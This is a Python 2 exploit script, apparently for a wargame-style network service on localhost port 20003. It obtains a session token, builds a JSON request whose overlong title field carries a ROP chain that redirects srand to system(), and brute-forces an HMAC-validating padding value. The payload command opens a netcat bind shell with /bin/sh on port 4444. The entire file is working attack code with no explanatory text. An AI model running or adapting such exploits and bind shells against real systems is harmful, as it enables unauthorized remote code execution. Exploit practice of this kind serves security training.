#!/usr/bin/python

from socket import *  
from struct import *  
from hashlib import sha1  
import hmac

s = socket(AF_INET, SOCK_STREAM)  
s.connect(("localhost", 20003))  
print("[+] Getting token")  
token = s.recv(1024)  
token = token.strip().strip('"')  
print("[+] Token: " + token)

p = ""  
p += pack("<I", 0x8049b4f)                               # pop eax ; add esp 0x5c  
p += "\\\u609b\\\u0000"                                  # system - srand offset  
p += "A"*0x5c                                                            # so that esp points to the following instruction  
p += pack("<I", 0x8048bf0)                               # pop ebx ;;  
p += pack("<I", (0x0804bcd4 - 0x5d5b04c4) &amp; 0xffffffff)  
p += pack("<I", 0x80493fe)                               # add [ebx+0x5d5b04c4] eax  
p += pack("<I", 0x8048c20)                               # srand(system) PLT entry address  
p += pack("<I", 0x8048f80)                               # return address is PLT entry for exit()  
p += pack("<I", 0x89dd550)                               # argument to system() stored in gContent  
cmd = "//////////////////////////////////bin/nc -lp4444 -e/bin/sh"

test_request = '{ "contents": "' + cmd + '", "title": "' + "A"*127 + "\\\\u4141" + "A"*31 + p + '", "tags": ["test1", "test2"], "serverip": "127.0.0.1" }'

print("[+] Test request: " + test_request)  
mac = hmac.new(token, token + "\n" + test_request, sha1).digest()  
print("[+] Test request MAC: " + mac.encode('hex'))  
print("[+] Modifying hash till it starts with 0000")

i = 0  
new_request = ""  
while True:  
        new_request = test_request[0:-1] + ', "padding": "' + str(i) + '"}'
        hexmac = hmac.new(token, token + "\n" + new_request, sha1).digest().encode("hex")
        if "0000" in hexmac[0:4]:
                break
        i += 1
print("[+] New request: " + new_request)  
print("[+] New MAC: " + hmac.new(token, token + "\n" + new_request, sha1).digest().encode("hex"))  
print("[+] Sending test request to server")  
s.send(token + "\n" + new_request)  
s.close()  
